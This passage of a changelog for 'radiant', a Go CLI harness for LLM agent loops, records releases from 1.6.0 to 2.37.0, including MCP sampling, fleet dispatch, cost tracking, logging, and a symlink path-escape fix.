  and loads the matching semantic model; fails open if no YAML exists.
- `executorSystemPromptWithIntensity()` now takes a `semanticBlock` and
  injects it between the lazy-executor skill and the project context.
- Result: in projects detected as `credit-risk`, every executor
  iteration gets the full PD/LGD/EAD/RWA formulas with regulation
  references automatically — no prompt engineering required.

### Added — Lazy-executor skill (`internal/skill/skills/lazy-executor/`)
- New skill porting the [ponytail ladder](https://github.com/DietrichGebert/ponytail)
  in PT-BR, adapted to the radiant context where the verifier
  already cuts code that doesn't satisfy ACs.
- `SKILL.md` covers the 7-rung ladder, decision tree, workflow,
  examples, anti-patterns, failure modes, related skills — all required
  by schema rule 10.
- `frontmatter.yaml` schema-compliant (tier_eligible, version, license).
- Embedded via existing `bundle.go` `//go:embed` machinery.

### Added — Intensity filter (`internal/skill/intensity.go`)
- 4 levels: `lite`, `full` (default), `ultra`, `off`.
- `FilterForIntensity()` strips table rows and bullet examples whose
  label doesn't match the active intensity — mirrors ponytail's
  `filterSkillBodyForMode`.
- Preserves all non-labeled prose (rules, workflow, anti-patterns).
- 10 unit tests covering all intensity paths.

### Added — CLI: `--intensity` flag (`cmd/radiant/cmd_loop.go`)
- `--intensity=lite|full|ultra|off` on `radiant loop start`.
- Default: `full` (skill always injected unless explicitly off).

### Security — `pathIsSafe` symlink fix (`internal/engine/engine.go`)
- Original implementation did only lexical comparison — paths like
  `evil/target.txt` passed the check even when `evil` was a symlink
  pointing outside the project.
- New strategy: resolve both sides to realpaths. For the candidate,
  walk up to the longest existing prefix and resolve that — so a
  proposed new file under a symlinked parent still gets caught.
- `resolveLongestExistingPrefix()` walks up until something exists.
- `fileExists()` helper for clarity.
- 3 new tests: `TestPathIsSafe_SymlinkEscape`,
  `TestPathIsSafe_SymlinkedProjectRoot`, plus existing
  `TestPathIsSafe` still passes.

### Documentation
- `docs/MODES.md` — full operator guide: decision tree, architecture
  diagrams per mode, resolution rules, pricing implications,
  capability matrix, when-to-use-each guidance.
- `docs/IMPLEMENTATION-PLAN.md` — roadmap for v2.37.0 (the plan
  this release executed).
- README updated with Choose-Your-Mode section, mode/pricing/semantic
  command reference, lazy-executor skill mention, semantic-model
  auto-injection explanation.
- `.radiant-harness/` and `radiant` (root binary) added to `.gitignore`.

### Stats
- 9 commits on branch `feature/light-full-release` (8 features + 1 plan).
- 5 new packages: `internal/mode/`, `internal/pricing/`, `internal/semantic/`,
  `internal/tools/` (scaffold), plus extensions to `internal/skill/`,
  `internal/engine/`, `internal/loop/`, `internal/cmd/`.
- 4 new CLI subcommands: `mode`, `pricing`, `semantic`, plus `--intensity`
  flag on `radiant loop start`.
- 1 new skill: `lazy-executor` (PT-BR, port of the ponytail ladder).
- 7 new metrics in `credit-risk.yaml` (PD, LGD, EAD, RWA, ExpectedLoss,
  provision_min_ifrs9, capital_required) — references CMN 4.966 / IFRS 9 /
  Basileia.
- **921 tests passing across 26 packages, 0 failures** (validated with
  `go test -count=1 -v ./...`). `go vet ./...` clean.
- Cross-compile OK: linux/amd64 (15 MB), darwin/arm64 (14 MB), windows/amd64 (15 MB).
- 37 files changed: +4,747 / −1,050 LOC.

---

## [2.36.0] — 2026-06-28 — Dual-mode MCP backend: HTTP + MCP Sampling

### Added — `internal/llm/backend.go`
- Interface `Backend` com `Chat`, `ChatStream` e `ModelID` — abstração que desacopla o loop do transporte LLM.
- `HTTPBackend`: wrapper fino sobre o `Client` existente. Preserva toda a lógica de retry/backoff/429.
- Compile-time checks: `var _ Backend = (*HTTPBackend)(nil)` e `(*SamplingBackend)(nil)`.

### Added — `internal/llm/sampling.go`
- `SamplingBackend`: implementa `Backend` via protocolo MCP `sampling/createMessage` (spec §6.5).
- Quando o harness precisa de uma completion, emite um JSON-RPC request de volta ao cliente MCP e bloqueia até a resposta. O cliente (Claude Code, Hermes, Cursor, etc.) executa a inferência com suas próprias credenciais — **nenhuma API key necessária no processo do harness**.
- `Dispatch(raw []byte)`: roteia responses do cliente para o `Chat()` pendente via `sync.Map` — sem locks no caminho quente.
- `IsSamplingResponse(raw []byte)`: heurística para o read loop distinguir responses de requests.
- Messages com role `system` colapsadas no primeiro `user` message com prefixo `[SYSTEM]` (MCP sampling não tem role system nativo).
- Suporte a `modelPreferences.hints` para sugestão de modelo ao cliente.

### Changed — `internal/loop/runner.go`
- `RunConfig.Backend llm.Backend` — campo opcional. Quando não-nil, todas as fases (planner, executor, verifier, reviewer) usam este backend em vez de clientes HTTP.
- `resolveBackends()` — função interna que retorna 3 backends + 3 model IDs: usa `Backend` quando fornecido, constrói `HTTPBackend` por fase caso contrário. Compatibilidade total com código existente (zero-value `nil` → comportamento anterior).

### Changed — `cmd/radiant/helpers.go`
- **Elimina global `activeSamplingBackend`** — substituída por `mcpDispatcher`, struct criado uma vez por sessão MCP em `runMCPServe` e passado explicitamente pela cadeia de dispatch.
- `mcpDispatcher.backend()` retorna `llm.Backend` (interface), nunca o tipo concreto — `mcpRunFull` não sabe se está em modo HTTP ou sampling.
- Cadeia limpa: `runMCPServe → handleMCPRequest(d) → callMCPTool(d) → mcpRunFull(backend)`.
- `mcpRunFull(args, backend)` despacha para `mcpRunWithBackend` (sampling) ou `mcpRunHTTP` (normal) com base em `backend != nil`.
- `runMCPServe` aceita `samplingMode bool` — quando true, cria `SamplingBackend` e roteia responses JSON-RPC via `IsSamplingResponse` + `Dispatch`.

### Added — `cmd/radiant/cmd_audit.go`
- Flag `--sampling` em `radiant mcp-serve`: `radiant mcp-serve --sampling` ativa o modo sub-agente (sem API key, usa o agente chamador como LLM).

### Added — testes
- `internal/llm/backend_test.go` — 5 testes: interface checks, `ModelID` default/hint, `HTTPBackend` preserva model.
- `internal/llm/sampling_test.go` — 8 testes com `-race`: `SendsRequest`, `ReturnsResponse`, `ContextCancel`, `Dispatch_UnknownID`, `Dispatch_MalformedJSON`, `ConcurrentRequests` (10 goroutines), `SystemMessageCollapse`, `IsSamplingResponse` (6 subcasos).
- `cmd/radiant/sprint_sampling_test.go` — 6 testes: `ToolsListWorks`, `RoutesToSampling`, `DispatchesResponse`, `MixedRequestsAndResponses`, `NilDispatcher`, `HTTPFallback`.

### Result
- `go test ./... -race` verde em todos os 22 pacotes.
- `go vet ./...` limpo.
- Dois modos, um binário:
  ```
  radiant mcp-serve            # Modo A: API key própria (HTTP)
  radiant mcp-serve --sampling # Modo B: agente chamador fornece a inferência
  ```

## [2.35.0] — 2026-06-28 — install.sh + radiant setup-mcp

## [2.34.0] — 2026-06-28 — MCP radiant_run + agent onboarding

### Added — `cmd/radiant/helpers.go`
- `radiant_run` MCP tool: executa o harness completo em uma única chamada bloqueante (start → loop.Run() in-process → export trace). Sem exec.Command, sem dependência de PATH.
- `mcpRunFull()`: chama `loop.Run()`, `config.Load()`, `loop.ExportTrace()` e `loop.ExportTraceMarkdown()` diretamente em-processo.

### Added — `AGENTS.md` (raiz)
- Guia de onboarding para agentes: lido automaticamente por Codex, Hermes, Cursor e maioria dos frameworks. Contém comandos, perfis, regras e quick reference completo.

### Added — `CLAUDE.md` (raiz)
- Instrução compacta para Claude Code: lida automaticamente no início de cada sessão.

### Added — `docs/AGENT-SYSTEM-PROMPT.md`
- Template de system prompt para agentes externos que não carregam AGENTS.md automaticamente (Hermes, mimo, OpenRouter, LM Studio, Ollama, OpenAI Assistants).

### Changed — `internal/boot/boot.go`
- `RenderMarkdown` agora emite bloco `## AGENT PROTOCOL` com 4 passos imperativose regras. O output de `radiant boot` é suficiente para qualquer LLM executar o harness corretamente.

### Fixed — `cmd/radiant/helpers.go`
- `radiant_run` v1 usava `exec.Command` (dependia de PATH) e tinha poll loop unreachable (loop start é síncrono). Reescrito para chamadas in-process.

### Setup para usar radiant como sub-agente

```json
// .claude/settings.json
{
  "mcpServers": {
    "radiant": { "command": "/path/to/radiant", "args": ["mcp-serve"] }
  }
}
```

Prompt mínimo após setup: `"use radiant-harness para: <goal>"`

---

## [2.33.0] — 2026-06-27 — Structured JSONL logging wired no loop runner (Sprint 86)

22/22 packages green com -race. 6 novos testes em internal/loop/sprint86_test.go.

### Added — `internal/loop/runner.go`
- `RunConfig.LogJSON io.Writer` — quando não-nil, cada LLM call emite uma linha JSONL com time, level, event, run_id, phase, agent, model, result, tokens, cost_usd
- `traceCall` expandido para aceitar `logJSON io.Writer` como segundo parâmetro (nil-safe)
- Todos os 4 call sites atualizados para passar `cfg.LogJSON`

### Added — `cmd/radiant/cmd_loop.go`
- `loop start --log-json` — ativa JSONL em stdout (pipes para jq, Datadog, Loki, etc.)

### Fixed — `internal/loop/sprint50_test.go`
- Atualizado para nova assinatura de `traceCall` (adicionado `nil` como segundo arg)

---

## [2.32.0] — 2026-06-27 — Config file .radiant.yaml (Sprint 85)

### Added — `internal/config/config.go`
- `Config` struct com yaml/json tags: model, max_iter, profile, webhook_url, fleet_concurrency, fleet_max_retries, auto_route
- `Load(projectDir)` — lê `.radiant.yaml` ou `.radiant.yml`; retorna `&Config{}` vazio se não existir
- 6 testes em config_test.go

### Changed
- `loop start` aplica defaults do config (model, max_iter, profile, auto_route, webhook_url)
- `fleet dispatch` aplica defaults do config (fleet_concurrency, fleet_max_retries)

---

## [2.31.0] — 2026-06-27 — radiant doctor (Sprint 84)

### Added — `cmd/radiant/cmd_doctor.go`
- `radiant doctor` — verifica API key, git version, repo atual, worktrees stale, model e binary path
- Retorna exit code 1 se qualquer check falhar

---

## [2.30.0] — 2026-06-27 — Structured logging JSONL (Sprint 82)

### Added — `internal/slog/slog.go`
- `Logger` com `Info(Entry)` e `Error(Entry)` — emite JSONL com time, level, event, run_id, phase, tokens, cost_usd, data
- `New(io.Writer)`, `Discard()`, `Stdout()` construtores
- 5 testes em slog_test.go

---

## [2.29.0] — 2026-06-27 — Auto-retry com backoff no dispatcher (Sprint 83)

### Added — `internal/fleet/dispatch.go`
- `DispatchConfig.MaxRetries int` — retry automático por task em falha transiente
- `retryBackoff(n)` — backoff exponencial 2^n segundos, cap 60s
- Loop de retry por goroutine antes de marcar task como failed

---

## [2.28.0] — 2026-06-27 — fleet history (Sprint 81)

### Added — `internal/fleet/store.go`
- `FleetSummary` struct com json tags
- `ListFleets(projectDir)` — lista fleets newest-first por UpdatedAt

### Added — `cmd/radiant/cmd_fleet.go`
- `radiant fleet history [--json]`

---

## [2.27.0] — 2026-06-27 — loop history (Sprint 80)

### Added — `cmd/radiant/cmd_loop.go`
- `radiant loop history [--json]` — agrega runs: total, ok, failed, tokens, custo

---

## [2.26.0] — 2026-06-27 — fleet cancel (Sprint 78)

### Added — `cmd/radiant/cmd_fleet.go`
- `radiant fleet cancel <run-id> [task-id]` — SIGTERM ao processo do fleet ou task

---

## [2.25.0] — 2026-06-27 — fleet --concurrency + fleet cancel (Sprint 79)

### Added — `internal/fleet/dispatch.go`
- `DispatchConfig.MaxConcurrency int` — semáforo que limita goroutines ativas

### Added — `cmd/radiant/cmd_fleet.go`
- `fleet dispatch --concurrency N` e `--max-retries N`

---

## [2.24.0] — 2026-06-27 — loop cancel via PID file (Sprint 77)

### Added — `internal/loop/runner.go`
- `writePID(projectDir, runID)` — escreve PID em `.radiant-harness/pids/<runID>.pid`
- `removePID(projectDir, runID)` — limpa no defer do Run
- `CancelRun(projectDir, runID)` — lê PID file e manda SIGTERM
- `Run()` agora escreve/remove PID automaticamente
- 5 testes em sprint77_test.go

### Added — `cmd/radiant/cmd_loop.go`
- `radiant loop cancel <run-id>`

---

## [2.23.0] — 2026-06-27 — E2E tests: pipeline fleet completo (Sprint 76)

20/20 packages green com -race. 8 novos testes em internal/fleet/e2e_test.go.

### Added — `internal/fleet/e2e_test.go`
- 8 testes E2E: start→plan→dispatch(mock)→status→summary, ResetTask, JSON round-trip, watch termination, persistência em disco, UpdatedAt timing

---

## [2.22.0] — 2026-06-27 — fleet retry: re-dispatch de task individual (Sprint 74)

### Added — `cmd/radiant/cmd_fleet.go`
- `radiant fleet retry <run-id> <task-id> [--model] [--auto-route] [--timeout]`

---

## [2.21.0] — 2026-06-27 — Webhooks de evento (Sprint 73)

### Added — `internal/webhook/webhook.go`
- `Send(ctx, url, Payload)` — HTTP POST fire-and-forget, timeout 10s
- Eventos: `loop.done`, `loop.failed`, `fleet.task.done`, `fleet.task.failed`, `fleet.done`
- 6 testes em webhook_test.go incluindo timeout, 500, task_id, auto-timestamp

### Changed
- `radiant loop start` — flag `--webhook-url` posta evento ao terminar
- `radiant fleet dispatch` — flag `--webhook-url` posta evento ao completar

---

## [2.20.0] — 2026-06-27 — loop diff: git diff vs base branch (Sprint 72)

### Added — `cmd/radiant/cmd_loop.go`
- `radiant loop diff <run-id> [--base main] [--stat]`
- Fallback para eventos do trace quando o branch não existe mais

### Added — `cmd/radiant/helpers.go`
- `runGitInDir(dir, args...)` helper

---

## [2.19.0] — 2026-06-27 — loop export: JSON e Markdown (Sprint 70)

### Added — `internal/loop/trace.go`
- `TraceExport` struct com json tags
- `ExportTrace(runID, modelID, events)` — agrega tokens, custo, timestamps
- `ExportTraceMarkdown(exp)` — documento Markdown com header e eventos
- 10 novos testes em sprint70_test.go

### Added — `cmd/radiant/cmd_loop.go`
- `radiant loop export <run-id> [--format json|md] [--model <id>]`

---

## [2.18.0] — 2026-06-27 — fleet resume + ResetTask (Sprint 69)

### Added — `internal/fleet/store.go`
- `ResetTask(taskID)` — reseta task failed → pending, limpa evidence/agentID

### Added — `internal/fleet/dispatch.go`
- `Dispatcher.ResumeAll(ctx, extraArgs)` — reseta tasks failed e chama RunAll

### Added — `cmd/radiant/cmd_fleet.go`
- `radiant fleet resume <run-id> [--model] [--auto-route] [--timeout]`

---

## [2.17.0] — 2026-06-27 — Sprint 71: --task-timeout já existia via --timeout no dispatch

Sprint 71 foi absorvida pelo Sprint 60 (o flag --timeout por-agent já estava implementado
no DispatchConfig.Timeout e exposto via `fleet dispatch --timeout`). Não havia lacuna real.

---

## [2.16.0] — 2026-06-27 — JSON output: fleet status/summary + loop status (Sprint 68)

20/20 packages green com -race. 4 novos testes em internal/fleet/sprint68_test.go.

### Added
- `radiant fleet status <run-id> --json` — emite FleetStatus como JSON indentado
- `radiant fleet summary <run-id> --json` — emite FleetStatus completo como JSON (client faz a sumarização)
- `radiant loop status [run-id] --json` — emite TraceInfo (ou CycleState) como JSON
- `FleetStatus` fields: json tags snake_case (`run_id`, `goal`, `agent_count`, `tasks`, ...)
- `TraceInfo` fields: json tags snake_case (`run_id`, `event_count`, `last_phase`, `cost_usd`, ...)

---

## [2.15.0] — 2026-06-27 — Integração MCP: loop tools (Sprint 67)

20/20 packages green com -race. 8 novos testes no cmd/radiant package.

### Added — `cmd/radiant/helpers.go`
- `radiant_loop_start` — loop start via MCP com goal, model, max_iter, auto_route
- `radiant_loop_status` — progress via trace (run_id opcional); passa --model para FormatProgress
- `radiant_loop_list` — lista runs com evento count e custo; flag plain

### Added — `cmd/radiant/sprint67_mcp_test.go`
- 8 testes: tools/list inclui 3 novos tools, dispatch sem erro -32602 para cada variante

---

## [2.14.0] — 2026-06-27 — fleet watch (Sprint 66)

20/20 packages green com -race. 8 novos testes no fleet package.

### Added — `cmd/radiant/cmd_fleet.go`
- `fleet watch <run-id> [--interval N]` — polling a cada N segundos (default 10),
  limpa tela com ANSI e re-imprime FormatStatus; para quando todos tasks são done/failed

### Added — `internal/fleet/sprint66_test.go`
- 8 testes: condição de terminal (all-done, all-failed, mixed, one-pending, one-assigned, empty),
  FormatStatus reflete transição pending→done+evidence

---

## [2.13.0] — 2026-06-27 — Cost tracking em tempo real (Sprint 65)

20/20 packages green com -race. 16 novos testes no loop package.

### Changed — `internal/loop/pricing.go`
- `ModelPricing` agora tem `CostPer1KInput` além de `CostPer1KOutput`
- Tabela completa de 32 modelos com preços de input e output (junho 2026)
- `EstimateCost(modelID, tokensIn, tokensOut) (usd, ok)` — custo total em USD
- `FormatCost(usd)` — formata "$0.0042" ou "< $0.0001"

### Changed — `internal/loop/trace.go`
- `FormatProgress(runID, modelID, events)` — exibe linha "Cost: $X.XXXX" quando model conhecido
- `TraceInfo` ganha `TokensIn`, `TokensOut`, `CostUSD`, `ModelID`
- `ListTraceInfos` popula custo lendo `Meta["model"]` de cada evento
- `FormatTraceList` ganha coluna COST

### Changed — `cmd/radiant/cmd_loop.go`
- `loop status <run-id>` passa `--model` flag para `FormatProgress`

### Added — `internal/loop/sprint65_test.go`
- 16 testes: EstimateCost (5), FormatCost (4), FormatProgress+model (3), TraceInfo cost (2), FormatTraceList cost (2)

---

## [2.12.0] — 2026-06-27 — loop list + trace list rica (Sprint 64)

20/20 packages green com -race. 11 novos testes no loop package.

### Added — `internal/loop/trace.go`
- `TraceInfo` struct — resumo por run: EventCount, LastPhase, LastResult, LastAction, UpdatedAt
- `ListTraceInfos(projectDir)` — newest-first por UpdatedAt
- `FormatTraceList(infos)` — tabela RUN-ID / EVENTS / PHASE / RESULT / UPDATED

### Added — `cmd/radiant/cmd_loop.go`
- `loop list [--plain]` — novo subcomando; `--plain` retorna IDs brutos

### Changed — `cmd/radiant/cmd_loop.go`
- `trace list` usa `FormatTraceList` por padrão; `--plain` preserva comportamento anterior

### Added — `internal/loop/sprint64_test.go`
- 11 testes: ListTraceInfos (4), FormatTraceList (7)

---

## [2.11.0] — 2026-06-27 — loop status com trace progress (Sprint 63)

20/20 packages green com -race. 13 novos testes no loop package.

### Added — `internal/loop/trace.go`
- `TracePath(projectDir, runID)` — caminho canônico do JSONL trace
- `FormatProgress(runID, events)` — resumo compacto: iteração, fase, tokens, elapsed, last action, evidence

### Changed — `cmd/radiant/cmd_loop.go`
- `loop status [run-id]` — sem run-id: comportamento anterior; com run-id: lê trace e mostra FormatProgress

### Added — `internal/loop/sprint63_test.go`
- 13 testes: TracePath formato/unicidade, FormatProgress (9 casos), round-trip trace→progress

---

## [2.10.0] — 2026-06-27 — Fleet Status melhorado + fleet summary (Sprint 62)

20/20 packages green com -race. 9 novos testes no fleet package.

### Changed — `internal/fleet/coordinator.go`
- `FormatStatus`: linha de contadores por status (pending/assigned/done/failed), coluna
  Worktree/Evidence (worktree para assigned; preview 40 chars de evidence para done),
  hint "fleet plan" quando tasks = 0

### Added — `internal/fleet/coordinator.go`
- `FormatSummary(status)` — consolida evidence de tasks done, contagem N/total, lista failed

### Added — `cmd/radiant/cmd_fleet.go`
- `fleet summary <run-id>` — chama `FormatSummary`

### Added — `internal/fleet/sprint62_test.go`
- 9 testes: contadores, hint, evidence preview, worktree, summary sem done, N/total, evidence, failed, goal

---

## [2.9.0] — 2026-06-27 — Fleet Plan: decomposição automática de goal em tasks (Sprint 61)

20/20 packages green com -race. 11 novos testes no fleet package.

### Added — `internal/fleet/planner.go`
- `Plan(ctx, goal, client)` — heurística (research→implement→verify) com fallback automático
- `PlannerClient` interface — desacopla de `*llm.Client` para testabilidade
- LLM path: prompt estruturado, JSON parsing, strip de markdown fences, skip de entradas incompletas

### Added — `cmd/radiant/cmd_fleet.go`
- `fleet plan <run-id>` — lê goal do store, chama `fleet.Plan()`, persiste tasks
- Flags `--model` (LLM opcional) e `--api-key`

### Added — `internal/fleet/planner_test.go`
- 11 testes: heurística (6), fallback LLM→heurística (1), LLM sucesso (4)

---

## [2.8.0] — 2026-06-27 — Fleet Dispatch com AutoRoute (Sprint 60)

20/20 packages green com -race. 4 novos testes no fleet package.

### Added — `cmd/radiant/cmd_fleet.go`
- `fleet dispatch <run-id>` — spawna um processo por task pendente via `Dispatcher.RunAll()`
- Flags `--model`, `--auto-route`, `--timeout` forwarded a cada subprocesso como extraArgs
- Output: contagem de tarefas pendentes, config ativa, resultado final (sucesso/falha)

### Added — `internal/fleet/sprint60_test.go`
- 4 testes: model forwarded, nil extraArgs, --auto-route forwarded, multi-task (≥2 ocorrências)
- `captureWriter` com `sync.Mutex` (safe com -race em RunAll paralelo)

---

## [2.7.0] — 2026-06-27 — AutoRoute integrado no loop runner (Sprint 59)

20/20 packages green com -race. 10 novos testes no loop package.

### Added — `internal/loop/runner.go`
- `RunConfig.AutoRoute bool` — quando `true`, deriva modelos por fase do anchor:
  research/verify → TierTop, plan → TierMid, execute → anchor
- Fail-safe: família desconhecida ou sem sibling mais forte → anchor em todas as fases
- `VerifierModel` e `PlannerModel` explícitos ainda funcionam quando `AutoRoute=false`

### Added — `cmd/radiant/cmd_loop.go`
- `--auto-route` flag em `loop start` e `loop resume`

### Added — `internal/loop/sprint59_test.go`
- 10 testes: default false, derivação por família (claude/opus), fail-safe unknown,
  propagação de APIKey/BaseURL, `Run()` fail-open sem API key

---

## [2.6.0] — 2026-06-27 — Model Routing Engine + correções de validação (Sprint 58-val)

20/20 packages green com -race. Repo limpo.

### Added — `internal/routing/` (sessão anterior, integrado nesta validação)
- `capability.go` — `DetectAgent(projectDir)`: detecta qual agente hospeda a sessão
  (radiant loop, Claude Code, OpenCode, Cursor, Copilot, Windsurf, Codex, Gemini, Hermes)
  e retorna a `Strategy` de roteamento adequada
- `matrix.go` — tabela de capacidades por agente × fase (Research/Plan/Implement)
- `resolver.go` — `Resolve(anchor, agent, phases)`: resolve modelo por fase com fallback
- `emitter.go` — formata plano de roteamento para exibição no CLI
- `routing.go` — tipos e constantes do pacote (`AgentID`, `Strategy`, `Phase`)

### Fixed — bugs encontrados na validação
- `internal/routing/capability.go`: `~/.hermes` verificado no passo 3 (antes de
  .cursor/, .github/copilot-instructions.md, .windsurf/) — na dev machine causava
  cursor/copilot/windsurf sempre retornarem "hermes"; movido para passo 9
- `internal/llm/routing.go`: `strings.HasPrefix("gpt-5")` no bloco TierTop
  capturava `gpt-5-mini` e `gpt-5-nano`; corrigido para `presetName == "gpt-5"`
- `internal/context/detector.go`: `"platform"` em `DomainOps` gerava
  falso-positivo em "Trading Platform" → substituído por `"ops-platform"`
- `internal/llm/routing_test.go` + `client_test.go`: nomes de preset atualizados
  (`claude-sonnet-4.5` → `claude-sonnet-4-6`, `claude-opus-4.1` → `claude-opus-4-8`),
  tiers corrigidos para refletir `routing.go` atual, `grok-2` removido

---

## [2.5.1] — 2026-06-27 — Remove cmd_data.go + cmd_integrations.go duplicatas (Sprint 58)

19/19 packages green. Zero regressões.

### Removed
- `cmd/radiant/cmd_data.go` — todos os 7 comandos (`causal-estimate`, `model`, `predict`,
  `train`, `evaluate`, `drift`, `profile`) já existiam em `cmd_telemetry.go`; arquivo
  nunca foi wired em `main.go`
- `cmd/radiant/cmd_integrations.go` — todos os 8 comandos (`integrations`, `evals`,
  `release`, `audit`, `mcp`, `security`, `validate-file`, `autodata`) já existiam em
  `cmd_audit.go`, `cmd_telemetry.go` e `cmd_spec.go`; arquivo nunca foi wired em `main.go`

---

## [2.5.0] — 2026-06-27 — Context Detector: múltiplas fontes de sinal (Sprint 57)

19/19 packages green. 53 testes no context package (↑13).

### Added — `internal/context/detector.go`
- `domainKeywordPatterns` — termos de negócio/domínio para fontes prose (separado de `domainImportPatterns`)
- `scanModulePath(projectDir)` — lê `go.mod` module path, score +20 por keyword hit
- `scanDocs(projectDir)` — lê README.md / CLAUDE.md / docs/README.md (200 linhas), score +8
- `scanDirNames(projectDir)` — verifica dirs top-level (+12), internal/ (+8), cmd/ (+8)
- `Detect()` agora executa phases 2b/2c/2d antes de eleger o domínio vencedor

### Added — `internal/context/sprint57_test.go`
- 13 novos testes cobrindo as três novas fases e multi-source agreement

### Closes
- GLM 5.2 assessment ponto 2: detector baseado só em imports → resolvido

---

## [2.4.0] — 2026-06-27 — Fleet Dispatcher: processos reais por worktree (Sprint 56)

19/19 packages green. 36 testes no fleet package (↑8).

### Added — `internal/fleet/dispatch.go`
- `Dispatcher` — spawna um processo OS por tarefa fleet em worktree git isolado (paralelo via goroutines)
- `DispatchConfig{Binary, Env, Stdout, Stderr, Timeout}` — configuração do dispatcher
- `AgentResult{AgentID, TaskID, ExitCode, Err, Elapsed}` — resultado por processo
- `NewDispatcher(iso, cfg)` — auto-resolve binary via `os.Executable()` se `cfg.Binary` for vazio
- `RunAll(ctx, extraArgs)` — claim de todas as tarefas pendentes → spawn paralelo → `CompleteTask` + `Release`
- `spawnAgent(ctx, task, wt, extraArgs)` — `exec.CommandContext` com `RADIANT_WORKTREE_DIR`, `RADIANT_AGENT_ID`, `RADIANT_TASK_ID` no env

### Added — `internal/fleet/dispatch_test.go`
- 8 novos testes: defaults, zero value, resolve executable, RunAll empty/success/failure/cancel
- Cleanup automático de branches git via `t.Cleanup` — zero branches órfãs entre runs

### Changed — `internal/fleet/coordinator.go`
- Comentário atualizado: Coordinator gerencia estado; Dispatcher é a camada de execução real

### Closes
- GLM 5.2 assessment ponto 3: "Fleet Coordinator does NOT spawn real processes" → resolvido

---

## [2.3.0] — 2026-06-27 — LLM Planning no loop (Sprint 55)

19/19 packages green. 144 testes no loop package (↑11).

### Added — `internal/loop/runner.go`
- `RunConfig.Plan bool` — habilita LLM planning na fase Plan (opt-in, default false)
- `RunConfig.PlannerModel llm.Model` — modelo separado para planner (zero → ExecutorModel)
- `BuildPlannerPrompt(goal string, iteration int) string` — prompt do planner, exportado
- `plannerSystemPrompt()` — instrui o LLM a decompor o goal em ≤10 passos numerados
- `buildExecutorPrompt` — nova assinatura com `planOutput string`; injeta bloco PLAN: antes de PRIOR REVIEW

### Added — `cmd/radiant/cmd_loop.go`
- `--plan` flag em `loopStartCmd` e `loopResumeCmd`
- `--planner-model` flag em `loopStartCmd` e `loopResumeCmd`

### Fixed
- `sprint47_test.go` — 5 calls a `buildExecutorPrompt` atualizadas para nova assinatura

---

## [2.2.0] — 2026-06-27 — helpers.go extraction (Sprint 54)

19/19 packages green. 651 testes.

### Refactor — `cmd/radiant/`
- `main.go` reduzido a 36 linhas (entry point puro: root + 10 register calls + Execute)
- 99 funções helpers movidas para `helpers.go` (4562 linhas, todas compartilhadas)
- Ponto 1 do GLM 5.2 assessment completamente resolvido

---

## [2.1.0] — 2026-06-27 — main.go Split + Token Estimation (Sprint 53B)

19/19 packages green. 651 testes. gofmt + goimports clean.

### Refactor — `cmd/radiant/`
- Split `main.go` (7.117 linhas) em 10 arquivos de registro de comandos por domínio
- `main()` reduzida a 26 linhas: root declaration + 10 `registerXxx(root)` + Execute
- Arquivos criados: `cmd_run.go`, `cmd_spec.go`, `cmd_audit.go`, `cmd_telemetry.go`,
  `cmd_ops.go`, `cmd_session.go`, `cmd_skills.go`, `cmd_context.go`,
  `cmd_fleet.go`, `cmd_loop.go`
- Zero mudança de behavior — Cobra multi-file, todos `package main`

### Fixed — `internal/loop/runner.go`
- `estimateTokens`: trocou `len/4` (bytes) por `utf8.RuneCountInString/3.5` (runes)
- Correção para português, CJK e qualquer conteúdo multibyte UTF-8
- Testes `sprint47_test.go` atualizados para os novos valores corretos

---

## [2.0.0] — 2026-06-27 — Output Streaming (Sprint 52)

19/19 packages green. 133 testes no loop package (↑8).

### Added — `internal/loop/runner.go`
- `RunConfig.Stream bool` — executor usa `ChatStream` quando true; verifier permanece não-streaming
- `RunConfig.StreamOut StreamWriter` — writer para chunks; nil → `os.Stdout`
- `StreamWriter` interface — `Write([]byte)` satisfeita por `*os.File`, `*bytes.Buffer`
- `simpleChatStream()` — wrapper de `ChatStream` com acumulação + escrita em tempo real
- Header `── executor (iter N) ──` e separador escritos ao redor de cada chamada streaming

### Fixed — `internal/loop/runner.go`
- Bug: `discover → discover` causava `invalid transition` em toda primeira chamada real a `Run()`
  Fix: skip da transição quando `c.State().Phase == PhaseDiscover`

### Added — `cmd/radiant/main.go`
- `--stream` flag em `loopStartCmd`

---

## [1.9.0] — 2026-06-27 — Context Injection (Sprint 51)

19/19 packages green. 125 testes no loop package (↑11).

### Added — `internal/loop/runner.go`
- `RunConfig.ContextBudgetTokens int` — 0 = disabled; >0 = detect + assemble CONTEXT.md
- `assembleContextBlock(projectDir, tokens)` — fail-open; monta uma vez por run, injeta em todas as iterações
- `executorSystemPrompt(contextBlock string)` — estendido; context appended após base prompt
- Import: `internal/context` (radctx), `os`

### Added — `cmd/radiant/main.go`
- `--context-budget <n>` flag em `loopStartCmd`

### Fixed — `internal/loop/sprint47_test.go`
- `executorSystemPrompt()` → `executorSystemPrompt("")` (assinatura mudou)

---

## [1.8.0] — 2026-06-27 — Trace Integration (Sprint 50)

19/19 packages green. 114 testes no loop package (↑10 neste sprint).

### Added — `internal/loop/runner.go`
- `traceCall()` — nil-safe helper; grava `TraceEvent` após cada `SimpleChat`
- `RunConfig.Trace *Tracer` — campo opcional; nil → tracer criado automaticamente
- Tracer auto-criado com `defer tr.Close()` para flush garantido
- Eventos gravados por iteração: `executor` (execute), `verifier` (verify), `reviewer` (verify)
- `PromptHash`: `sha256(prompt)[0:4]` hex; `Meta["model"]`: modelo usado na chamada
- Tokens split 50/50 entre `TokensIn` / `TokensOut` (estimativa quando provider não retorna contagem)

### Added — `internal/loop/sprint50_test.go` (10 testes)
- nil-safety, campos de evento, hash por prompt, múltiplos eventos, arquivo criado em disco, timestamp

---

## [1.7.0] — 2026-06-27 — Status Cost + Resume Wiring (Sprint 49)

19/19 packages green.

### Changed — `radiant loop status`
- Budget line now shown when tokens or cost data present: `tokens 12450/50000 | cost $0.0374/$1.00`
- Silent when budget not configured (zero-value check)

### Changed — `radiant loop resume`
- Now calls `loop.Run()` — resumes real LLM inference from persisted phase
- Restores `BudgetConfig` from persisted `Snapshot` (tokens, iter, cost ceiling)
- Guards against resuming a finished run (exits with clear error unless `needs_human`)
- New flags: `--model`, `--verifier-model`, `--base-url`, `--dry-run`

---

## [1.6.0] — 2026-06-27 — Loop Runner Wiring (Sprint 48)

`radiant loop start` now calls `loop.Run()` end-to-end. 19/19 packages green.

### Added — `loopStartCmd` rewrite
- Calls `loop.Run()` — autonomous loop with real LLM inference
- `resolveLoopLLMCreds()` — vendor-neutral API key resolution (OpenRouter → OpenAI → Anthropic)
